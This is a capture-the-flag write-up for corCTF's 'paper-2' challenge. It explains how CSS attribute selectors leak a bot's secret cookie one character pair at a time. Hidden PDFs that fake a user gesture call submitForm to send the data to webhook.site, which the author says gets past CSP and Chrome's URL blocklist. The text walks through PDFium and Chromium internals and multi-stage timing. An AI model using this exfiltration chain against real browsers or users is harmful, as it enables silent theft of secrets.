...
Sequel to the `paper` challenge from corCTF 2025 by ehhthing, where v2 patches all known solutions by blocking external network access from the bot's browser entirely. The solve is CSS injection with PDF JavaScript beacons.

### The server

Bun + Puppeteer + Redis -- upload files, bot visits your page, leak the secret, get the flag. The [full source is in the appendix](#appendix-index-ts) but here's what matters.

`POST /upload` takes any file up to 64KB and stores the content type from the upload verbatim with no validation. `GET /paper/:id` serves it back with that content type, so uploading as `text/html` gives you arbitrary HTML on the challenge origin.

`GET /secret` is where the fun is:
...
The bot's `secret` cookie gets placed into a `secret` attribute on `<body>`, and the `payload` query parameter is injected **raw** into the HTML with no escaping whatsoever -- full HTML injection via the query string.

`GET /flag` takes a `secret` parameter and compares it against the stored value using `redis.getdel('secret')`, which atomically reads and deletes the key, giving you exactly one shot.

`GET /visit/:id` triggers the bot: it generates a 32-hex-char secret (`randomBytes(16).toString('hex')`), sets it as a `SameSite=Strict` cookie, stores it in Redis with a **60-second TTL**, navigates to our page, and sleeps for 61 seconds. That gives us exactly 60 seconds to exfiltrate and submit.

### The constraints

Every response gets this CSP:

```
default-src 'self' 'unsafe-inline'; script-src 'none'
```

`script-src 'none'` means no JS anywhere -- not in uploaded pages, not in injected HTML, nowhere -- but `default-src 'self' 'unsafe-inline'` leaves inline CSS wide open, and same-origin iframes and `<object>` tags are fair game too.

And then there's the Chrome enterprise policy:

```json
{ "URLBlocklist": ["*"], "URLAllowlist": ["https://web"] }
```

The bot can't reach any external URL -- not through navigation, not through resource loading, not through anything -- and this is what makes v2 so much harder than v1.

### v1 is dead

The corCTF 2025 v1 solution by Jorian Woltjer used `window.open()` from an attacker-hosted page with CSS to conditionally hide `<object>` elements, counted `window.length` from JS to detect which character matched, and exfiltrated via `navigator.sendBeacon()`. Paper-2 kills both halves of that approach: there's no JS context to count frames from, and no external network to exfiltrate to.

### So how do you get data out?

We need something that can:

1. Detect which CSS selectors matched (which characters of the secret are correct)
2. Transmit that information to us externally
3. Do both without JavaScript and without external network access from the page

CSS attribute selectors handle #1 -- `body[secret^="a1"]` matches if the secret starts with `"a1"`, and we can toggle `display: none` / `display: block` on `<object>` tags to conditionally load resources based on which selector matches (the browser won't fetch the `data` URL of a hidden `<object>`).

But #2 and #3 seem impossible, since the page can't run JS and the browser can't reach external URLs. How do you phone home?

### PDFs should not be able to do this

Chrome's built-in PDF viewer (PDFium) has its own JavaScript engine, and when you load a PDF via `<object data="/paper/1" type=application/pdf>`, any JS embedded in it runs in a completely separate context from the HTML page -- the page's CSP doesn't apply, and `this.submitForm()` in PDF JS can make outbound HTTP requests.

But `submitForm` has a user interaction requirement; you're not supposed to be able to call it programmatically, and PDFs definitely should not be making unsolicited outbound network requests. Let's look at why we can anyway.

### Faking a user gesture in PDFium

PDFium's `submitForm` implementation in [`fxjs/cjs_document.cpp`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_document.cpp) checks for a user gesture before allowing the call:
...
And [`IsUserGesture()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_event_context.cpp) is:
...
That's it -- no transient activation token, no propagation tracking from actual input events, no verification that a human did anything. "User gesture" in PDFium just means "the current JS is executing inside an event context whose `kind_` is one of three enum values," and if `kind_ == kFieldKeystroke`, `submitForm` goes through.

So the question is whether we can get code to run in a `kFieldKeystroke` context without any actual user interaction, and it turns out we can: programmatically setting a form field's value triggers the field's keystroke action (`/AA /K`), and that action runs in a `kFieldKeystroke` context. Here's the full call chain through PDFium:

1. **Document opens.** The `/OpenAction` JS runs in a `kDocOpen` context. Our script: `this.getField('q').value = 'x'`

2. **[`CJS_Field::set_value()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_field.cpp)** calls `SetFieldValue()`, which calls `pFormField->SetValue(strArray[0], NotificationOption::kNotify)`. The `kNotify` flag is the key -- it triggers the form's notification system.
...
4. **[`CPDFSDK_InteractiveForm::BeforeValueChange()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fpdfsdk/cpdfsdk_interactiveform.cpp)** calls `OnKeyStrokeCommit()`, which checks if the field has a `/AA /K` (keystroke) additional action. It does, so it dispatches:
...
6. **Our keystroke action JS now runs** in a `kFieldKeystroke` context, so `IsUserGesture()` returns `true` and `submitForm` goes through.

The notification system (`kNotify`) was originally designed for maintaining form consistency -- triggering validation, formatting, and calculations when a field changes -- but it inadvertently creates a privilege escalation path: `kDocOpen` (no gesture) -> programmatic `set_value` -> `kNotify` -> `BeforeValueChange` -> `OnKeyStrokeCommit` -> `/AA /K` action in `kFieldKeystroke` context (gesture!) -> `submitForm` allowed.

### Why CSP and URLBlocklist don't apply either

There are two more layers that should have stopped this, and neither does.

**CSP bypass:** The PDF plugin ([`PdfViewWebPlugin`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/pdf_view_web_plugin.cc)) runs as a `blink::WebPlugin` inside a MimeHandlerView guest frame -- a cross-process OOPIF with its own security context, entirely separate from the embedding page. When `submitForm` fires, `PdfViewWebPlugin::SubmitForm()` constructs its own `UrlRequest` and sends it through [`UrlLoader`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/loader/url_loader.cc), configured with:

```cpp
options.grant_universal_access = true;
```

The request is tagged as `RequestContextType::PLUGIN` / `RequestDestination::kEmbed`, and when `grant_universal_access` is true the URL loader creates a universally-privileged opaque `SecurityOrigin` via `GrantUniversalAccess()`. The Chromium source has a comment: *"When true, omit origin related checks. USE WITH CARE."*

Because the request originates from the plugin's privileged loader rather than the page's document context, the embedding page's CSP headers are never consulted -- `script-src`, `connect-src`, `form-action`, none of them see this request.

**URLBlocklist bypass:** Chrome's enterprise URL blocklist targets navigations and standard frame/resource loads, but the PDF plugin's `submitForm` POST goes through `WebAssociatedURLLoader` with `grant_universal_access` and `RequestContextType::PLUGIN` -- a completely different code path that the policy enforcement doesn't cover.

<Callout variant="important">
Three separate security boundaries, all bypassed. PDFium thinks this is a user-initiated action (because `kFieldKeystroke`). Chrome's PDF plugin sends it through a privileged URL loader that bypasses CSP. And the enterprise URL blocklist doesn't intercept plugin-level POSTs. The result: a PDF loaded via `<object>` can silently POST to any URL on the internet.
</Callout>

### The beacon PDF

With all that in mind, the beacon PDF is straightforward -- a minimal PDF-1.7 with an AcroForm containing a text field widget `"q"` that has a `/AA /K` keystroke action, plus an OpenAction that kicks off the chain.
...
`this.URL` is the URL the PDF was loaded from, so if we load the beacon via `<object data="/paper/1?s=0&d=p&c=a1">`, `this.URL` contains those query params and `submitForm` forwards them to webhook.site. From our exploit script, we just poll webhook.site's API to see what came back.
...
```
Main page (our HTML, uploaded to /paper/{main_id})
  +-- <iframe> --> helper page (our HTML, /paper/{helper_id})
  ...
  |                 +-- PDF opens, OpenAction fires
  |                       +-- submitForm("https://webhook.site/...?s=0&d=p&c=a1")
  ...
  +-- <meta http-equiv="refresh" content="6.5;url=/paper/{next_stage}">
```

When the bot loads this, `body[secret^="a1"]` matches (assuming the secret starts with `a1`), so `#p1` gets `display: block` and Chrome loads that PDF while all the other objects stay hidden and are never fetched. The PDF phones home, and we learn that stage 0's prefix is `"a1"`.

### Multi-stage exfiltration

The secret is 32 hex characters, and since CSS `^=` and `$=` only match from the start and end of the attribute value (there's no "match at position N" selector), we have to grow the known prefix rightward and suffix leftward, 2 characters at a time from each end:

```
Stage 0: prefix=""   suffix=""        --> learns first 2 + last 2
Stage 1: prefix="a1" suffix="90"      --> learns chars 3-4 + 29-30
...
Stage 7: all 32 chars known
```

Each stage has 16 helper pages (one per high hex nibble `0`-`f`), each testing 16 low nibbles for both prefix and suffix directions -- that's 32 `<object>` tags per helper, and across all 16, exactly one prefix and one suffix beacon fires.

Stages are linked by `<meta http-equiv="refresh">` with a 6.5-second delay; after the refresh fires, the bot navigates to the next stage's main page, and we use that window to collect the webhook callbacks and upload the next stage (which needs the newly-known characters in its CSS selectors).

Since upload IDs are sequential (`redis.incr`) and each stage consumes exactly 17 IDs (16 helpers + 1 main), we can predict all future IDs from the beacon's ID and verify after each upload. If another user takes an ID the chain breaks, so use a fresh instance.

Total timing comes out to ~57 seconds across 8 stages, fitting under the 60-second Redis TTL with about 3 seconds to spare.
